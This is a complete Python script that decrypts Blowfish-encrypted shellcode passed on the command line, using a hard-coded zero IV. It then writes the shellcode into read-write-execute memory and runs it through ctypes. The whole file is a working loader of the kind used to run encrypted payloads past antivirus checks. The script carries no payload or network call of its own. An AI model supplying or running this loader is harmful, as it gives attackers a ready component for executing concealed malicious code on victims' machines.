#!/usr/bin/env python3
import sys
import blowfish
import mmap
import ctypes

key = bytes(sys.argv[1], 'utf-8')
enc_shellcode = bytes.fromhex(sys.argv[2].replace('\\x', ''))

iv = b'\x00\x00\x00\x00\x00\x00\x00\x00' #urandom(8)
cipher = blowfish.Cipher(key)
blocks = cipher.decrypt_cfb(enc_shellcode, iv)

shellcode = []
for block in blocks:
    for byte in block:
        shellcode.append(byte)

shellcode_bytes = bytes(shellcode)

# execute shellcode
exec_mem = mmap.mmap(-1, len(shellcode_bytes), prot = mmap.PROT_READ |
        mmap.PROT_WRITE | mmap.PROT_EXEC, flags = mmap.MAP_ANONYMOUS |
        mmap.MAP_PRIVATE)
exec_mem.write(shellcode_bytes)

ctypes_buffer = ctypes.c_int.from_buffer(exec_mem)
func = ctypes.CFUNCTYPE(ctypes.c_int64)(ctypes.addressof(ctypes_buffer))
func._avoid_gc_for_mmap = exec_mem

func()
